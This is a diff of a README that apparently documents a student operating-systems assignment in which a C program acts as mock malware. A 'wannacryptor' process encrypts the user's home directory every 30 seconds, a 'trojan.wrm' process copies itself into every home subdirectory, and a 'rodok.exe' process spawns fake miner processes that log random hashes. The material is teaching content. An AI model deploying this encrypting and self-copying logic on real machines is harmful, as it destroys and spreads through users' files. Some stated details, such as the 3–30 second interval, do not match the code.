@@ -1317,9 +1317,345 @@ oid spread_malw(const char *source_path, const char *target_dir) {
 * `const char *target_dir` is the directory path leading to user's HOME path.  
 * `DIR *dir = opendir(target_dir);` to declare and open the directory path of the user's HOME path.  
 * `struct dirent *entry;` to delcare each entry in the directory path, which will later be used on to scan each file/subdirectory in the directory.
-* 
+* `while ((entry = readdir(dir)) != NULL) {` is a while loop to read all of the directory path inside the directory path that has been given to the function in the beginning.  
+The line below it, is to continue on (skip) when current (.) or parent (..) directory is read in the loop.  
+* `snprintf(full_path, sizeof(full_path), "%s/%s", target_dir, entry->d_name);` to make a combination of string, forming a new directory path leading to the file/subdirectory that is being read in that iteration.  
+* `snprintf(new_path, sizeof(new_path), "%s/malware_copy", full_path);` is to create a new path that can lead to another sub-subdirectory inside the subdirectory that is read previously (after passing the IF statement).  
+* `if (mkdir(new_path, 0755) == -1) {` is to make e new directory called the "malware_copy" as it is intended on the previous line. If the return value of that line is `-1` it means the sub-subdirectory with that name already exist in the subdirectory.
+* After that, by making another daemon process, using the `execlp()` to copy the malware runnable file into the designated sub-subdirectory. The exact line to execute this is `execlp("cp", "cp", "-f", "--preserve=all", source_path, new_path, NULL);`.
+* As so to prevent a zombie process happening, use `waitpid(pid, NULL, 0);` so the parent process would wait until the child process to finish before it finishes.
+
+## Sub Soal d
+
+#### Objective 
+
+Making sure the first and second feature of the malware to **run repeatedly every 30 seconds intervals**, as long the malware is still running  
+
+Block of Code that is running:
+
+```c
+  // first feature
+  pid_t wannacryptor_pid = fork();
+  if (wannacryptor_pid == 0) {
+      set_process_name("wannacryptor");
+      while (1) {
+          time_t timestamp = time(NULL);
+          encrypt_dir(home, (int)(timestamp % 256));
+          fprintf(log_file, "Encryption performed at %ld\n", timestamp);
+          fflush(log_file);
+          sleep(30);
+      }
+    } else if (wannacryptor_pid < 0) {
+      log_error("Fork failed for wannacryptor: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+    } 
+  fclose(log_file);
+    
+  // second feature
+  pid_t trojan_pid = fork();
+  if (trojan_pid == 0) {
+      set_process_name("trojan.wrm");
+      while (1) {
+          spread_malw(self_path, home);
+          sleep(30);
+      }
+  } else if (trojan_pid < 0) {
+      log_error("Fork failed for trojan: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+```
+Output: 
+
+![output_example](assets/temp.txt)
 
 
+#### Explanation
+
+Here's the process to declare the start of the malware in the main function: 
+
+For the wannacryptor:
+
+```c
+pid_t wannacryptor_pid = fork();
+  if (wannacryptor_pid == 0) {
+      set_process_name("wannacryptor");
+      while (1) {
+          time_t timestamp = time(NULL);
+          encrypt_dir(home, (int)(timestamp % 256));
+          fprintf(log_file, "Encryption performed at %ld\n", timestamp);
+          fflush(log_file);
+          sleep(30);
+      }
+    } else if (wannacryptor_pid < 0) {
+      log_error("Fork failed for wannacryptor: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+    } 
+  fclose(log_file);
+  ```
+
+  For the trojan.wrm: 
+  
+  ```c
+  pid_t trojan_pid = fork();
+  if (trojan_pid == 0) {
+      set_process_name("trojan.wrm");
+      while (1) {
+          spread_malw(self_path, home);
+          sleep(30);
+      }
+  } else if (trojan_pid < 0) {
+      log_error("Fork failed for trojan: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+  ```
+
+  * Both starts with declaring their own daemon process and making their own child process to run the malware.  
+  * Both also have a while loop where the loop will always run with a 30 seconds interval, indicated by `sleep(30);`
+  * As long as the malware isn't stopped deliberately, the malware will **run indefinitely repeatedly every 30 seconds**.
+
+## Sub Soal e
+
+#### Objective
+
+Make a third feature called **rodok.exe** to do a **fork bomb** on the user's device.
+
+Block of Code that is running: 
+
+```c
+// function: start rodok
+void start_rodok() { 
+  int num_miners = sysconf(_SC_NPROCESSORS_ONLN);
+  if (num_miners < 3) num_miners = 3;
+
+  for (int i = 0; i < num_miners; i++) {
+      pid_t pid = fork();
+      if (pid == 0) {
+          char process_name[20];
+          snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);
+          set_process_name(process_name);
+          miner_process(i);
+          exit(EXIT_SUCCESS);
+      } else if (pid < 0) {
+          log_error("Fork failed for miner %d", i);
+      }
+  }
+
+  while (1) {
+      sleep(1);
+  }
+}
+
+int main(int argc, char *argv[]) {
+pid_t rodok_pid = fork();
+  if (rodok_pid == 0) {
+      set_process_name("rodok.exe");
+      start_rodok(); 
+  } else if (rodok_pid < 0) {
+      log_error("Fork failed for rodok: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+while (1) {
+    sleep(1);
+  }
+  
+  return 0;
+}
+```
+
+Output: 
+
+![output_example](assets/temp.txt)
+
+#### Explanation
+
+For starters, declare another daemon process to run on itself in the main function, with: 
+
+```c
+int main(int argc, char *argv[]) {
+pid_t rodok_pid = fork();
+  if (rodok_pid == 0) {
+      set_process_name("rodok.exe");
+      start_rodok(); 
+  } else if (rodok_pid < 0) {
+      log_error("Fork failed for rodok: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+while (1) {
+    sleep(1);
+  }
+  
+  return 0;
+}
+```
+
+* `pid_t rodok_pid = fork();` to declare the start of daemon process dedicated for rodok.exe. 
+* `set_process_name("rodok.exe");` to set the name of the process as "rodok.exe" in kernel.  
+* `start_rodok();` to call the `start_rodok()` function above. 
+
+The `start_rodok();` is like: 
+
+```c
+void start_rodok() { 
+  int num_miners = sysconf(_SC_NPROCESSORS_ONLN);
+  if (num_miners < 3) num_miners = 3;
+
+  for (int i = 0; i < num_miners; i++) {
+      pid_t pid = fork();
+      if (pid == 0) {
+          char process_name[20];
+          snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);
+          set_process_name(process_name);
+          miner_process(i);
+          exit(EXIT_SUCCESS);
+      } else if (pid < 0) {
+          log_error("Fork failed for miner %d", i);
+      }
+  }
+
+  while (1) {
+      sleep(1);
+  }
+}
+```
+
+* `int num_miners = sysconf(_SC_NPROCESSORS_ONLN);` is to make a limitation on how many miners it will fork for a safter testing later on.  
+The maximum amount of miner child that is made by the fork bomb should be the amount of device's core.  
+* `if (num_miners < 3) num_miners = 3;` to make sure the minimum number of miners to be made in the fork bomb is 3.
+* `for (int i = 0; i < num_miners; i++) {` is to loop the process below it at many as the amount of `num_miners`
+* Since the loop will run as much as the `num_miners`, it will make the processes as much `num_miners` with `pid_t pid = fork();`.
+*  `snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i)` is to make the string for the name of the miner process according the naming format that is included in the file. 
+* `set_process_name(process_name);` is to set the process name as `process_name`. 
+* `miner_process(i);` here is to call the `miner_process()` function with the argument of the miner's id process.
+
+## Sub Soal f & g & h
+
+#### Objective 
+
+Make the miner process with the **name format** and make a **random hexadecimal hash** as long as **64 characters** that can **run repateadly in a random interval of 3–30 seconds**. Miner can also save the hash in the **/tmp/.miner.log** with the format: `[YYYY-MM-DD hh:mm:ss][Miner XX] hash`
+
+Block of Code that is running: 
+
+```c
+void miner_process(int miner_id) {
+  srand(time(NULL) ^ (miner_id << 16));
+  
+  while (1) {
+      char hash[65];
+      for (int i = 0; i < 32; i++) {
+          unsigned char byte = rand() % 256;
+          sprintf(hash + 2*i, "%02x", byte);
+      }
+      hash[64] = '\0';
+
+      time_t now = time(NULL);
+      struct tm *t = localtime(&now);
+
+      FILE *log_file = fopen("/tmp/.miner.log", "a");
+      if (log_file) {
+          fprintf(log_file, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n",
+                  t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                  t->tm_hour, t->tm_min, t->tm_sec, miner_id, hash);
+          fclose(log_file);
+      }
+
+      sleep(rand() % 13 + 3);
+  }
+}
+
+void start_rodok() { 
+  int num_miners = sysconf(_SC_NPROCESSORS_ONLN);
+  if (num_miners < 3) num_miners = 3;
+
+  for (int i = 0; i < num_miners; i++) {
+      pid_t pid = fork();
+      if (pid == 0) {
+          char process_name[20];
+          snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);
+          set_process_name(process_name);
+          miner_process(i);
+          exit(EXIT_SUCCESS);
+      } else if (pid < 0) {
+          log_error("Fork failed for miner %d", i);
+      }
+  }
+}
+```
+
+Output: 
+
+![output_example](assets/temp.txt)
+
+#### Explanation
+
+For setting the name of miner process is at the `start_rodok()`: 
+
+```c
+for (int i = 0; i < num_miners; i++) {
+      pid_t pid = fork();
+      if (pid == 0) {
+          char process_name[20];
+          snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);
+          set_process_name(process_name);
+          miner_process(i);
+          exit(EXIT_SUCCESS);
+      } else if (pid < 0) {
+          log_error("Fork failed for miner %d", i);
+      }
+  }
+```
+
+* `snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);` is setting the process name for miner with the format of `mine-crafter-xx` with `i` as the `xx` or the `i-th` process of `mine-crafter`.
+
+And then the `miner_process()`: 
+
+```c
+void miner_process(int miner_id) {
+  srand(time(NULL) ^ (miner_id << 16));
+  
+  while (1) {
+      char hash[65];
+      for (int i = 0; i < 32; i++) {
+          unsigned char byte = rand() % 256;
+          sprintf(hash + 2*i, "%02x", byte);
+      }
+      hash[64] = '\0';
+
+      time_t now = time(NULL);
+      struct tm *t = localtime(&now);
+
+      FILE *log_file = fopen("/tmp/.miner.log", "a");
+      if (log_file) {
+          fprintf(log_file, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n",
+                  t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                  t->tm_hour, t->tm_min, t->tm_sec, miner_id, hash);
+          fclose(log_file);
+      }
+
+      sleep(rand() % 13 + 3);
+  }
+}
+```
+
+* `miner_id` as in the argument that will be passed on onto the function 
+* `srand(time(NULL) ^ (miner_id << 16));` to change the `rand()` seed so it will be unique everytime the process is run.  
+And the seed is also impacted by the XOR function with the miner_id after shifted to the left by 16 positions.
+* `while (1) {` meaning it will run the loop endlessly and repeatedly. 
+* `for (int i = 0; i < 32; i++) {` is the main loop for the process to make the hash as long as 64 characters.  
+The loop is made to be iterating 32 times because each hexadecimal will contain 2 characters.
+* `unsigned char byte = rand() % 256;` is to get a random byte value.  
+* `sprintf(hash + 2*i, "%02x", byte);` is to form the hash with position iteration of `2i` and for each iteration it will print out 2 hexadecimal characters from byte in that position.
+* `time_t now = time(NULL);` to get the current time.
+* `struct tm *t = localtime(&now);` to make struct tm according to the timestamp gotten from the line before. 
+* `FILE *log_file = fopen("/tmp/.miner.log", "a");` will open the file `/tmp/.miner.log` with the mode `append`. 
+* `fprintf(log_file, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec, miner_id, hash);` is to print the line in the `fprintf()` into the `/tmp/.miner.log` according to the format given.  
+  * `%04d` is a place for 4 characters of integers.  
+  * `%02d` is a place for 2 characters of integers. 
+  * `t->tm_year` is the amount of years that has passed since 1900 in the `struct tm *t`.
+  * `t->tm_mon` is in which month the timestamp is from `0-11` in the `struct tm *t`.
+  * `t->tm_hour` is in what hour the timestamp is in the `struct tm *t`.
+  * `t->tm_min` is in what minute the timestamp is in the `struct tm *t`.
+  * `t->tm_sec` is in what second the timestamp is in the `struct tm *t`.
+* `sleep(rand() % 13 + 3);` to randomly run the miner process with a minimum time of every 3 seconds
 
 # Soal_4
 
